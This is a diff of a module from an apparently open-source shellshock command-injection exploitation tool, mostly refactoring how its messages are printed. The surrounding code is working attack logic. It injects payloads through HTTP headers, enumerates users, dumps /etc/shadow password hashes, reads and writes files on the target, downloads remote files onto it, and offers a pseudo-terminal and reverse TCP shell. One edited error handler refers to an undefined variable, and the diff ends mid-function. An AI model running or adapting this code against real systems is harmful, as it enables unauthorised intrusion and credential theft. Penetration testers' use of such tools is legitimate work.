@@ -82,14 +82,16 @@ def enumeration(url, cve, check_header, filename):
   #-------------------------------
   if menu.options.hostname:
     cmd = settings.HOSTNAME
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "(!) The hostname is " + Style.UNDERLINE + shell + Style.RESET_ALL + ".\n")
+    success_msg = "The hostname is " + Style.UNDERLINE + shell
+    sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
     sys.stdout.flush()
     # Add infos to logs file. 
     output_file = open(filename, "a")
-    output_file.write("    (!) The hostname is " + shell + ".\n")
+    success_msg = "The hostname is " + shell + ".\n"
+    output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
     output_file.close()
     settings.ENUMERATION_DONE = True
 
@@ -98,29 +100,33 @@ def enumeration(url, cve, check_header, filename):
   #-------------------------------
   if menu.options.sys_info:
     cmd = settings.RECOGNISE_OS            
-    target_os = cmd_exec(url, cmd, cve, check_header, filename)
+    target_os, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if target_os == "Linux":
       cmd = settings.RECOGNISE_HP
-      target_arch = cmd_exec(url, cmd, cve, check_header, filename)
+      target_arch, payload = cmd_exec(url, cmd, cve, check_header, filename)
       if target_arch:
         if menu.options.verbose:
           print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL)
-        sys.stdout.write(Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch + Style.RESET_ALL + ".\n")
+        success_msg = "The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL  
+        success_msg += Style.BRIGHT + " and the hardware platform is " + Style.UNDERLINE + target_arch
+        sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("    (!) The target operating system is " + target_os)
-        output_file.write(" and the hardware platform is " + target_arch + ".\n")
+        success_msg = "The target operating system is " + target_os
+        success_msg += " and the hardware platform is " + target_arch + ".\n"
+        output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()
     else:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The target operating system is " + Style.UNDERLINE + target_os + Style.RESET_ALL + ".\n")
+      success_msg = "The target operating system is " + Style.UNDERLINE + target_os   
+      sys.stdout.write(settings.print_success_msg(success_msg) + ".\n")
       sys.stdout.flush()
       # Add infos to logs file.    
       output_file = open(filename, "a")
-      output_file.write("    (!) The target operating system is " + target_os + ".\n")
+      success_msg = "The target operating system is " + target_os + ".\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
     settings.ENUMERATION_DONE = True
 
@@ -129,17 +135,19 @@ def enumeration(url, cve, check_header, filename):
   #-------------------------------
   if menu.options.current_user:
     cmd = settings.CURRENT_USER
-    cu_account = cmd_exec(url, cmd, cve, check_header, filename)
+    cu_account, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if cu_account:
       if menu.options.is_root:
         cmd = settings.IS_ROOT
-        shell = cmd_exec(url, cmd, cve, check_header, filename)
+        shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
         if menu.options.verbose:
           print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL)
+        success_msg = "The current user is " + Style.UNDERLINE + cu_account  
+        sys.stdout.write(settings.print_success_msg(success_msg))
         # Add infos to logs file.    
         output_file = open(filename, "a")
-        output_file.write("    (!) The current user is " + cu_account)
+        success_msg = "The current user is " + cu_account
+        output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()
         if shell:
           if shell != "0":
@@ -159,11 +167,13 @@ def enumeration(url, cve, check_header, filename):
       else:
         if menu.options.verbose:
           print ""
-        sys.stdout.write(Style.BRIGHT + "(!) The current user is " + Style.UNDERLINE + cu_account + Style.RESET_ALL + ".\n")
+        success_msg = "The current user is " + Style.UNDERLINE + cu_account  
+        sys.stdout.write(settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("    (!) The current user is " + cu_account + "\n")
+        success_msg = "The current user is " + cu_account + "\n"
+        output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
         output_file.close()  
     settings.ENUMERATION_DONE = True
 
@@ -172,91 +182,115 @@ def enumeration(url, cve, check_header, filename):
   #-------------------------------
   if menu.options.users:
     cmd = settings.SYS_USERS             
-    sys_users = cmd_exec(url, cmd, cve, check_header, filename)
+    sys_users, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if menu.options.verbose:
       print ""
-    sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.PASSWD_FILE + "' to enumerate users entries... ")
+    info_msg = "Fetching '" + settings.PASSWD_FILE 
+    info_msg += "' to enumerate users entries... "  
+    sys.stdout.write(settings.print_info_msg(info_msg))
     sys.stdout.flush()
-    if sys_users[0] :
-      sys_users = "".join(str(p) for p in sys_users).strip()
-      if len(sys_users.split(" ")) <= 1 :
-        sys_users = sys_users.split("\n")
-      else:
-        sys_users = sys_users.split(" ")
-      # Check for appropriate '/etc/passwd' format.
-      if len(sys_users) % 3 != 0 :
-        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
-        sys.stdout.flush()
-        print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
-        sys_users = " ".join(str(p) for p in sys_users).strip()
-        print sys_users
-        output_file = open(filename, "a")
-        output_file.write("      " + sys_users)
-        output_file.close()
-      else:  
-        sys_users_list = []
-        for user in range(0, len(sys_users), 3):
-           sys_users_list.append(sys_users[user : user + 3])
-        if len(sys_users_list) != 0 :
-          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n" + Style.RESET_ALL)
+    try:
+      if sys_users[0] :
+        sys_users = "".join(str(p) for p in sys_users).strip()
+        if len(sys_users.split(" ")) <= 1 :
+          sys_users = sys_users.split("\n")
+        else:
+          sys_users = sys_users.split(" ")
+        # Check for appropriate '/etc/passwd' format.
+        if len(sys_users) % 3 != 0 :
+          sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
           sys.stdout.flush()
-          # Add infos to logs file.   
+          warn_msg = "It seems that '" + settings.PASSWD_FILE 
+          warn_msg += "' file is not in the appropriate format. Thus, it is expoted as a text file." 
+          print "\n" + settings.print_warning_msg(warn_msg) 
+          sys_users = " ".join(str(p) for p in sys_users).strip()
+          print sys_users
           output_file = open(filename, "a")
-          output_file.write("\n    (!) Identified " + str(len(sys_users_list)) + " entr" + ('ies', 'y')[len(sys_users_list) == 1] + " in '" +  settings.PASSWD_FILE + "'.\n")
+          output_file.write("      " + sys_users)
           output_file.close()
-          count = 0
-          for user in range(0, len(sys_users_list)):
-            sys_users = sys_users_list[user]
-            sys_users = ":".join(str(p) for p in sys_users)
-            count = count + 1
-            fields = sys_users.split(":")
-            fields1 = "".join(str(p) for p in fields)
-            # System users privileges enumeration
-            try:
-              if not fields[2].startswith("/"):
-                raise ValueError()
-              if menu.options.privileges:
-                if int(fields[1]) == 0:
-                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
-                  is_privileged_nh = " is root user "
-                elif int(fields[1]) > 0 and int(fields[1]) < 99 :
-                  is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
-                  is_privileged_nh = " is system user "
-                elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
-                  if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
-                    is_privileged_nh = " is anonymous user "
-                  elif int(fields[1]) == 60002:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
-                    is_privileged_nh = " is non-trusted user "   
-                  else:
-                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
-                    is_privileged_nh = " is regular user "
+        else:  
+          sys_users_list = []
+          for user in range(0, len(sys_users), 3):
+             sys_users_list.append(sys_users[user : user + 3])
+          if len(sys_users_list) != 0 :
+            sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+            success_msg = "Identified " + str(len(sys_users_list)) 
+            success_msg += " entr" + ('ies', 'y')[len(sys_users_list) == 1] 
+            success_msg += " in '" +  settings.PASSWD_FILE + "'.\n"
+            sys.stdout.write("\n" + settings.print_success_msg(success_msg))
+            sys.stdout.flush()
+            # Add infos to logs file.   
+            output_file = open(filename, "a")
+            output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg)
+            output_file.close()
+            count = 0
+            for user in range(0, len(sys_users_list)):
+              sys_users = sys_users_list[user]
+              sys_users = ":".join(str(p) for p in sys_users)
+              count = count + 1
+              fields = sys_users.split(":")
+              fields1 = "".join(str(p) for p in fields)
+              # System users privileges enumeration
+              try:
+                if not fields[2].startswith("/"):
+                  raise ValueError()
+                if menu.options.privileges:
+                  if int(fields[1]) == 0:
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " root user "
+                    is_privileged_nh = " is root user "
+                  elif int(fields[1]) > 0 and int(fields[1]) < 99 :
+                    is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " system user "
+                    is_privileged_nh = " is system user "
+                  elif int(fields[1]) >= 99 and int(fields[1]) < 65534 :
+                    if int(fields[1]) == 99 or int(fields[1]) == 60001 or int(fields[1]) == 65534:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " anonymous user "
+                      is_privileged_nh = " is anonymous user "
+                    elif int(fields[1]) == 60002:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " non-trusted user "
+                      is_privileged_nh = " is non-trusted user "   
+                    else:
+                      is_privileged = Style.RESET_ALL + " is" +  Style.BRIGHT + " regular user "
+                      is_privileged_nh = " is regular user "
+                  else :
+                    is_privileged = ""
+                    is_privileged_nh = ""
                 else :
                   is_privileged = ""
                   is_privileged_nh = ""
-              else :
-                is_privileged = ""
-                is_privileged_nh = ""
-              print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
-              # Add infos to logs file.   
-              output_file = open(filename, "a")
-              output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
-              output_file.close()
-            except ValueError:
-              if count == 1 :
-                print Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.PASSWD_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL 
-              sys_users = " ".join(str(p) for p in sys_users.split(":"))
-              print sys_users
-              output_file = open(filename, "a")
-              output_file.write("      " + sys_users)
-              output_file.close()
-    else:
-      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+                print "  (" +str(count)+ ") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privileged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
+                # Add infos to logs file.   
+                output_file = open(filename, "a")
+                output_file.write("      (" +str(count)+ ") '" + fields[0]+ "'" + is_privileged_nh + "(uid=" + fields[1] + "). Home directory is in '" + fields[2] + "'.\n" )
+                output_file.close()
+              except ValueError:
+                if count == 1 :
+                  warn_msg = "It seems that '" + settings.PASSWD_FILE 
+                  warn_msg += "' file is not in the appropriate format. "
+                  warn_msg += "Thus, it is expoted as a text file." 
+                  print settings.print_warning_msg(warn_msg) 
+                sys_users = " ".join(str(p) for p in sys_users.split(":"))
+                print sys_users
+                output_file = open(filename, "a")
+                output_file.write("      " + sys_users)
+                output_file.close()
+      else:
+        sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+        sys.stdout.flush()
+        warn_msg = "It seems that you don't have permissions to read '" 
+        warn_msg += settings.PASSWD_FILE + "' to enumerate users entries."
+        print "\n" + settings.print_warning_msg(warn_msg)   
+    except TypeError:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]\n")
       sys.stdout.flush()
-      print "\n" + Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.PASSWD_FILE + "' to enumerate users entries." + Style.RESET_ALL   
+      pass
 
+    except IndexError:
+      sys.stdout.write("[ " + Fore.RED + "FAILED" + Style.RESET_ALL + " ]")
+      warn_msg = "It seems that you don't have permissions to read '" 
+      warn_msg += settings.PASSWD_FILE + "' to enumerate users entries." 
+      sys.stdout.write("\n" + settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
+      pass
     settings.ENUMERATION_DONE = True
 
   #-------------------------------------
@@ -264,7 +298,7 @@ def enumeration(url, cve, check_header, filename):
   #-------------------------------------
   if menu.options.passwords:
     cmd = settings.SYS_PASSES            
-    sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
+    sys_passes, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if sys_passes :
       sys_passes = "".join(str(p) for p in sys_passes)
       sys_passes = sys_passes.replace(" ", "\n")
@@ -272,14 +306,19 @@ def enumeration(url, cve, check_header, filename):
       if len(sys_passes) != 0 :
         if menu.options.verbose:
           print ""
-        sys.stdout.write(settings.INFO_SIGN + "Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+        info_msg = "Fetching '" + settings.SHADOW_FILE 
+        info_msg += "' to enumerate users password hashes... "  
+        sys.stdout.write(settings.print_info_msg(info_msg))
         sys.stdout.flush()
         sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
+        success_msg = "Identified " + str(len(sys_passes))
+        success_msg += " entr" + ('ies', 'y')[len(sys_passes) == 1] 
+        success_msg += " in '" +  settings.SHADOW_FILE + "'.\n"
+        sys.stdout.write("\n" + settings.print_success_msg(success_msg))
         sys.stdout.flush()
         # Add infos to logs file.   
         output_file = open(filename, "a")
-        output_file.write("\n    (!) Identified " + str(len(sys_passes)) + " entr" + ('ies', 'y')[len(sys_passes) == 1] + " in '" +  settings.SHADOW_FILE + "'.\n" )
+        output_file.write("\n    " + settings.SUCCESS_SIGN + success_msg )
         output_file.close()
         count = 0
         for line in sys_passes:
@@ -295,13 +334,18 @@ def enumeration(url, cve, check_header, filename):
           # Check for appropriate (/etc/shadow) format
           except IndexError:
             if count == 1 :
-              sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+              warn_msg = "It seems that '" + settings.SHADOW_FILE 
+              warn_msg += "' file is not in the appropriate format. "
+              warn_msg += "Thus, it is expoted as a text file."
+              sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
             print fields[0]
             output_file = open(filename, "a")
             output_file.write("      " + fields[0])
             output_file.close()
       else:
-        print Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read '" + settings.SHADOW_FILE + "' to enumerate users password hashes." + Style.RESET_ALL
+        warn_msg = "It seems that you don't have permissions to read '"
+        warn_msg += settings.SHADOW_FILE + "' to enumerate users password hashes."
+        print settings.print_warning_msg(warn_msg)
     settings.ENUMERATION_DONE = True  
 
   if settings.ENUMERATION_DONE == True:
@@ -318,7 +362,8 @@ def file_access(url, cve, check_header, filename):
   if menu.options.file_write:
     file_to_write = menu.options.file_write
     if not os.path.exists(file_to_write):
-      sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
+      warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
+      sys.stdout.write(settings.print_warning_msg(warn_msg) + "\n")
       sys.stdout.flush()
       sys.exit(0)
       
@@ -327,7 +372,8 @@ def file_access(url, cve, check_header, filename):
         content = [line.replace("\r\n", "\n").replace("\r", "\n").replace("\n", " ") for line in content_file]
       content = "".join(str(p) for p in content).replace("'", "\"")
     else:
-      sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that '" + file_to_write + "' is not a file." + Style.RESET_ALL + "\n")
+      warn_msg = "It seems that '" + file_to_write + "' is not a file."
+      sys.stdout.write(settings.print_warning_msg(warn_msg))
       sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
@@ -343,20 +389,24 @@ def file_access(url, cve, check_header, filename):
       
     # Execute command
     cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'"
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     
     # Check if file exists!
     cmd = "ls " + dest_to_write + ""
     # Check if defined cookie injection.
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was created successfully!" + Style.RESET_ALL + "\n")
+      success_msg = "The " + Style.UNDERLINE + shell + Style.RESET_ALL 
+      success_msg += Style.BRIGHT + " file was created successfully!"  
+      sys.stdout.write(settings.print_success_msg(success_msg))
       sys.stdout.flush()
     else:
-     sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_write + "' file." + Style.RESET_ALL + "\n")
-     sys.stdout.flush()
+      warn_msg = "It seems that you don't have permissions to write the '"
+      warn_msg += dest_to_write + "' file." + "\n"
+      sys.stdout.write(settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
@@ -368,8 +418,10 @@ def file_access(url, cve, check_header, filename):
     # check if remote file exists.
     try:
       urllib2.urlopen(file_to_upload)
-    except urllib2.HTTPError, err:
-      sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that the '" + file_to_upload + "' file, does not exists. (" +str(err)+ ")" + Style.RESET_ALL + "\n")
+    except urllib2.HTTPError, warn_msg:
+      warn_msg = "It seems that the '" + file_to_upload + "' file, "
+      warn_msg += "does not exists. (" + str(warn_msg) + ")\n"
+      sys.stdout.write(settings.print_error_msg(warn_msg))
       sys.stdout.flush()
       sys.exit(0)
       
@@ -383,21 +435,26 @@ def file_access(url, cve, check_header, filename):
       
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
     cmd = "ls " + dest_to_upload
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     shell = "".join(str(p) for p in shell)
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT + " file was uploaded successfully!" + Style.RESET_ALL + "\n")
+      success_msg = "The " + Style.UNDERLINE + shell 
+      success_msg += Style.RESET_ALL + Style.BRIGHT 
+      success_msg += " file was uploaded successfully!\n"
+      sys.stdout.write(settings.print_success_msg(success_msg))
       sys.stdout.flush()
     else:
-     sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to write the '" + dest_to_upload + "' file." + Style.RESET_ALL + "\n")
-     sys.stdout.flush()
+      warn_msg = "It seems that you don't have permissions "
+      warn_msg += "to write the '" + dest_to_upload + "' file.\n"
+      sys.stdout.write(settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
   #-------------------------------------
@@ -407,19 +464,25 @@ def file_access(url, cve, check_header, filename):
     file_to_read = menu.options.file_read
     # Execute command
     cmd = "cat " + settings.FILE_READ + file_to_read
-    shell = cmd_exec(url, cmd, cve, check_header, filename)
+    shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
     if shell:
       if menu.options.verbose:
         print ""
-      sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
+      success_msg = "The contents of file '" + Style.UNDERLINE 
+      success_msg += file_to_read + Style.RESET_ALL + "' : "  
+      sys.stdout.write(settings.print_success_msg(success_msg))
       sys.stdout.flush()
       print shell
       output_file = open(filename, "a")
-      output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+      success_msg = "The contents of file '"
+      success_msg += file_to_read + "' : " + shell + ".\n"
+      output_file.write("    " + settings.SUCCESS_SIGN + success_msg)
       output_file.close()
     else:
-     sys.stdout.write(Fore.YELLOW + settings.WARNING_SIGN + "It seems that you don't have permissions to read the '" + file_to_read + "' file." + Style.RESET_ALL + "\n")
-     sys.stdout.flush()
+      warn_msg = "It seems that you don't have permissions "
+      warn_msg += "to read the '" + file_to_read + "' file.\n"
+      sys.stdout.write(settings.print_warning_msg(warn_msg))
+      sys.stdout.flush()
     settings.FILE_ACCESS_DONE = True
 
   if settings.FILE_ACCESS_DONE == True:
@@ -438,7 +501,8 @@ def shellshock_handler(url, http_request_method, filename):
   injection_type = "results-based command injection"
   technique = "shellshock injection technique"
 
-  sys.stdout.write(settings.INFO_SIGN + "Testing the " + technique + "... ")
+  info_msg = "Testing the " + technique + "... "
+  sys.stdout.write(settings.print_info_msg(info_msg))
   sys.stdout.flush()
 
   try: 
@@ -452,7 +516,7 @@ def shellshock_handler(url, http_request_method, filename):
 
         # Check if defined "--verbose" option.
         if menu.options.verbose:
-          sys.stdout.write("\n" + Fore.GREY + settings.PAYLOAD_SIGN + payload + Style.RESET_ALL)
+          sys.stdout.write("\n" + settings.print_payload(payload))
 
         header = {check_header : payload}
         request = urllib2.Request(url, None, header)
@@ -472,7 +536,8 @@ def shellshock_handler(url, http_request_method, filename):
           else:
             percent = str(float_percent )+ "%"
 
-          sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+          info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
+          sys.stdout.write("\r" + settings.print_info_msg(info_msg))
           sys.stdout.flush()
 
           # Print the findings to log file.
@@ -485,7 +550,9 @@ def shellshock_handler(url, http_request_method, filename):
 
         if cve in response.info():
           no_result = False
-          print Style.BRIGHT + "\n(!) The (" + check_header + ") '" + Style.UNDERLINE + url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to " + injection_type + "." + Style.RESET_ALL
+          success_msg = "The (" + check_header + ") '" + Style.UNDERLINE 
+          success_msg += url + Style.RESET_ALL + Style.BRIGHT + "' is vulnerable to " + injection_type + "."
+          print "\n" + settings.print_success_msg(success_msg)
           print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type.title() + Style.RESET_ALL + ""
           print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
           print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + "\"" + payload + "\"" + Style.RESET_ALL
@@ -496,7 +563,8 @@ def shellshock_handler(url, http_request_method, filename):
             if menu.options.verbose:
               print ""
             while True:
-              enumerate_again = raw_input(settings.QUESTION_SIGN + "Do you want to enumerate again? [Y/n/q] > ").lower()
+              question_msg = "Do you want to enumerate again? [Y/n/q] > "
+              enumerate_again = raw_input(settings.print_question_msg(question_msg)).lower()
               if enumerate_again in settings.CHOICE_YES:
                 enumeration(url, cve, check_header, filename)
                 break
@@ -507,7 +575,8 @@ def shellshock_handler(url, http_request_method, filename):
               else:
                 if enumerate_again == "":
                   enumerate_again = "enter"
-                print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                err_msg = "'" + enumerate_again + "' is not a valid answer."  
+                print settings.print_error_msg(err_msg) + "\n"
                 pass
           else:
             enumeration(url, cve, check_header, filename)
@@ -515,7 +584,8 @@ def shellshock_handler(url, http_request_method, filename):
           # File access options.
           if settings.FILE_ACCESS_DONE == True :
             while True:
-              file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n/q] > ").lower()
+              question_msg = "Do you want to access files again? [Y/n/q] > "
+              file_access_again = raw_input(settings.print_question_msg(question_msg)).lower()
               if file_access_again in settings.CHOICE_YES:
                 file_access(url, cve, check_header, filename)
                 break
@@ -526,15 +596,16 @@ def shellshock_handler(url, http_request_method, filename):
               else:
                 if file_access_again == "":
                   file_access_again  = "enter"
-                print Back.RED + settings.ERROR_SIGN + "'" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                err_msg = "'" + file_access_again  + "' is not a valid answer."  
+                print settings.print_error_msg(err_msg) + "\n"
                 pass
           else:
             file_access(url, cve, check_header, filename)
 
           if menu.options.os_cmd:
             cmd = menu.options.os_cmd 
-            shell = cmd_exec(url, cmd, cve, check_header, filename)
-            print Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
+            shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+            print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL 
             sys.exit(0)
 
           else:
@@ -547,7 +618,8 @@ def shellshock_handler(url, http_request_method, filename):
               if settings.ENUMERATION_DONE == False and settings.FILE_ACCESS_DONE == False:
                 if menu.options.verbose:
                   print ""
-              gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
+              question_msg = "Do you want a Pseudo-Terminal? [Y/n/q] > "
+              gotshell = raw_input(settings.print_question_msg(question_msg)).lower()
               if gotshell in settings.CHOICE_YES:
                 print ""
                 print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
@@ -579,7 +651,8 @@ def shellshock_handler(url, http_request_method, filename):
                         go_back = True
                         break
                       elif os_shell_option == "os_shell": 
-                          print Fore.YELLOW + settings.WARNING_SIGN + "You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                          warn_msg = "You are already into an 'os_shell' mode."
+                          print settings.print_warning_msg(warn_msg)+ "\n"
                       elif os_shell_option == "reverse_tcp":
                         # Set up LHOST / LPORT for The reverse TCP connection.
                         reverse_tcp.configure_reverse_tcp()
@@ -597,17 +670,24 @@ def shellshock_handler(url, http_request_method, filename):
                               settings.REVERSE_TCP = False
                               break
                           # Command execution results.
-                          shell = cmd_exec(url, cmd, cve, check_header, filename)
+                          shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
                           if menu.options.verbose:
                             print ""
-                          print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection to the target host has been failed!" + Style.RESET_ALL
+                          err_msg = "The reverse TCP connection to the target host has been failed!"
+                          print settings.print_error_msg(err_msg)
                       else:
                         pass
 
                     else: 
-                      shell = cmd_exec(url, cmd, cve, check_header, filename)
-                      print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n" 
-                      
+                      shell, payload = cmd_exec(url, cmd, cve, check_header, filename)
+                      if shell != "":
+                        print "\n" + Fore.GREEN + Style.BRIGHT + shell + Style.RESET_ALL + "\n"
+                      else:
+                        if menu.options.verbose:
+                          print "\n" + settings.print_payload(payload) 
+                        err_msg = "The '" + cmd + "' command, does not return any output."
+                        print settings.print_error_msg(err_msg) + "\n"
+
                   except KeyboardInterrupt:
                     raise
 
@@ -633,7 +713,8 @@ def shellshock_handler(url, http_request_method, filename):
               else:
                 if gotshell == "":
                   gotshell = "enter"
-                print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                err_msg = "'" + gotshell + "' is not a valid answer."  
+                print settings.print_error_msg(err_msg) + "\n"
                 continue
               break
       else:
@@ -641,7 +722,7 @@ def shellshock_handler(url, http_request_method, filename):
 
   except urllib2.HTTPError, err:
     if settings.IGNORE_ERR_MSG == False:
-      print "\n" + Back.RED + settings.ERROR_SIGN + str(err) + Style.RESET_ALL
+      print "\n" + settings.print_error_msg(err_msg)
       continue_tests = checks.continue_tests(err)
       if continue_tests == True:
         settings.IGNORE_ERR_MSG = True
@@ -650,8 +731,9 @@ def shellshock_handler(url, http_request_method, filename):
 
   except urllib2.URLError, err:
     if "Connection refused" in err.reason:
-      print Back.RED + settings.CRITICAL_SIGN + "The target host is not responding." + \
-            " Please ensure that is up and try again." + Style.RESET_ALL
+      err_msg =  "The target host is not responding."
+      err_msg += " Please ensure that is up and try again."
+      print "\n" + settings.print_critical_msg(err_msg)
     raise SystemExit()
     
 """
@@ -665,30 +747,29 @@ def cmd_exec(url, cmd, cve, check_header, filename):
   def check_for_shell(url, cmd, cve, check_header, filename):
     try:
